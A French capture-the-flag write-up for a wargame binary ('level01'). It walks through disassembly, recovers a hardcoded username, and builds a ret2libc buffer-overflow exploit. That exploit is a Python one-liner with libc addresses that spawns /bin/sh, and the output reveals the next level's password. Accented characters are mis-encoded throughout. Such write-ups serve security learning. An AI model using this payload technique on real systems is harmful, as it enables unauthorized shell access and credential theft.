# Analyse

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

## Binaire

`./level01`
```
********* ADMIN LOGIN PROMPT *********
Enter Username:
```
`test`
```
verifying username....

nope, incorrect username...

```
## Gdb

`info function`
```asm
[...]
  0x08048464  verify_user_name
  0x080484a3  verify_user_pass
  0x080484d0  main
[...]
```


`disas main`
```asm
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   ebp
   0x080484d1 <+1>:	mov    ebp,esp
   0x080484d3 <+3>:	push   edi
   0x080484d4 <+4>:	push   ebx
   0x080484d5 <+5>:	and    esp,0xfffffff0
   0x080484d8 <+8>:	sub    esp,0x60
   0x080484db <+11>:	lea    ebx,[esp+0x1c]
   0x080484df <+15>:	mov    eax,0x0
   0x080484e4 <+20>:	mov    edx,0x10
   0x080484e9 <+25>:	mov    edi,ebx
   0x080484eb <+27>:	mov    ecx,edx
   0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax         ; memset(buffer, 0, 16);
   0x080484ef <+31>:	mov    DWORD PTR [esp+0x5c],0x0
   0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8
   0x080484fe <+46>:	call   0x8048380 <puts@plt>             ; puts("********* ADMIN LOGIN PROMPT *********");
   0x08048503 <+51>:	mov    eax,0x80486df
   0x08048508 <+56>:	mov    DWORD PTR [esp],eax
   0x0804850b <+59>:	call   0x8048360 <printf@plt>           ; printf("Enter Username: ");
   0x08048510 <+64>:	mov    eax,ds:0x804a020
   0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
   0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>            ; fgets(<a_user_name>, 256, <stdin>);
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804853b <+107>:	je     0x8048550 <main+128>             ; if verify_user_name() == 0:   jump ?? <+128>  
   0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
   0x08048544 <+116>:	call   0x8048380 <puts@plt>             ; puts("nope, incorrect username...\n");
   0x08048549 <+121>:	mov    eax,0x1
   0x0804854e <+126>:	jmp    0x80485af <main+223>             ; jump ?? <+223>
   0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d
   0x08048557 <+135>:	call   0x8048380 <puts@plt>             ; puts("Enter Password: ");
   0x0804855c <+140>:	mov    eax,ds:0x804a020
   0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>:	lea    eax,[esp+0x1c]
   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>            ; fgets(buffer, 100, <stdin>);
   0x08048579 <+169>:	lea    eax,[esp+0x1c]
   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>     
   0x08048585 <+181>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>:	je     0x8048597 <main+199>             ; if verify_user_pass(buffer) == 0:   jump ?? <+199>
   0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>:	je     0x80485aa <main+218>             ; idem mais jump ?? <+218> (return(0))
   0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
   0x0804859e <+206>:	call   0x8048380 <puts@plt>             ; puts("nope, incorrect password...\n");
   0x080485a3 <+211>:	mov    eax,0x1
   0x080485a8 <+216>:	jmp    0x80485af <main+223>             ; jump ?? <+223> (return(1))
   0x080485aa <+218>:	mov    eax,0x0
   0x080485af <+223>:	lea    esp,[ebp-0x8]
   0x080485b2 <+226>:	pop    ebx
   0x080485b3 <+227>:	pop    edi
   0x080485b4 <+228>:	pop    ebp
   0x080485b5 <+229>:	ret
End of assembler dump.
```

`disas verify_user_name`
```asm
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   ebp
   0x08048465 <+1>:	mov    ebp,esp
   0x08048467 <+3>:	push   edi
   0x08048468 <+4>:	push   esi
   0x08048469 <+5>:	sub    esp,0x10
   0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690
   0x08048473 <+15>:	call   0x8048380 <puts@plt>                       ; puts("verifying username....\n");
   0x08048478 <+20>:	mov    edx,0x804a040
   0x0804847d <+25>:	mov    eax,0x80486a8
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]     ; return strcmp("dat_wil", <a_user_name>);
   0x0804848d <+41>:	seta   dl
   0x08048490 <+44>:	setb   al
   0x08048493 <+47>:	mov    ecx,edx
   0x08048495 <+49>:	sub    cl,al
   0x08048497 <+51>:	mov    eax,ecx
   0x08048499 <+53>:	movsx  eax,al
   0x0804849c <+56>:	add    esp,0x10
   0x0804849f <+59>:	pop    esi
   0x080484a0 <+60>:	pop    edi
   0x080484a1 <+61>:	pop    ebp
   0x080484a2 <+62>:	ret
End of assembler dump.
```

`disas verify_user_pass`
```asm
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   ebp
   0x080484a4 <+1>:	mov    ebp,esp
   0x080484a6 <+3>:	push   edi
   0x080484a7 <+4>:	push   esi
   0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>:	mov    edx,eax
   0x080484ad <+10>:	mov    eax,0x80486b0
   0x080484b2 <+15>:	mov    ecx,0x5
   0x080484b7 <+20>:	mov    esi,edx
   0x080484b9 <+22>:	mov    edi,eax
   0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]     ; return strcmp("admin", argv[1]);
   0x080484bd <+26>:	seta   dl
   0x080484c0 <+29>:	setb   al
   0x080484c3 <+32>:	mov    ecx,edx
   0x080484c5 <+34>:	sub    cl,al
   0x080484c7 <+36>:	mov    eax,ecx
   0x080484c9 <+38>:	movsx  eax,al
   0x080484cc <+41>:	pop    esi
   0x080484cd <+42>:	pop    edi
   0x080484ce <+43>:	pop    ebp
   0x080484cf <+44>:	ret
End of assembler dump.
```

# Exploit

Le programme compare le username fourni avec "dat_wil", puis le password fourni avec "admin".<br/><br/>
`./level01`
```
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```
Quel que soit le mot de passe, il affiche "nope, incorrect password..." et return, puis de toutes fa??ons ?? aucun moment il ne nous affiche le fichier .pass ou nous ouvre un shell, donc on va devoir se d??brouiller tout seul.

Nous allons appeler directement la fonction system() de la libc, en lui fournissant comme argument la chaine de caract??re "/bin/sh".<br/>
doc principale : https://beta.hackndo.com/retour-a-la-libc/<br/>

Tout d'abord, on note que fgets() est utilis?? sans protection sur un buffer ?? <main+164>. On peut donc faire un buffer overflow, cherchons l'offset avec un [g??n??rateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

```
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
- L'EIP est r????crit avec un offset de 80. 

Notre exploit sera compos?? comme suit:
[ Offset de 80 (NopSled) ] [ Adresse system() ] [ Adresse retour (osef) ] [ Adresse "/bin/sh" ].

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
- L'adresse de system() est 0xf7e6aed0 (\xd0\xae\xe6\xf7)

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
Cette commande recherche dans une plage m??moire commen??ant au d??but de la fonction __libc_start_main() (appel??e avant notre fonction main), et d???une taille de 99 999 999 octets la string "/bin/sh".
- L'adresse de "/bin/sh" est 0xf7f897ec (\xec\x97\xf8\xf7)

`(python -c 'print "dat_wil\n" + "\x90" * 80 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"'; cat - ) | ./level01`
```
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
/bin/sh: 3: ???: not found
Segmentation fault (core dumped)
```


